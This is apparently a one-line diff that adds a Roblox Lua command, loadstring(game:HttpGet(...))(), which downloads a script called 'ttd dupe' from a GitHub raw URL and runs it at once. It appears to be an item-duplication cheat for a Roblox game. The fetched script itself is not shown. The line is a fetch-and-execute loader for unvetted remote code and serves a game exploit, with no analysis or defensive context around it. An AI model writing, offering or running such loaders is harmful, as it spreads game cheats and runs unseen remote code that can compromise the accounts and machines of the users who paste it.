@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/andriashava2/Ttd-dupi/main/ttd%20dupe.txt"))()
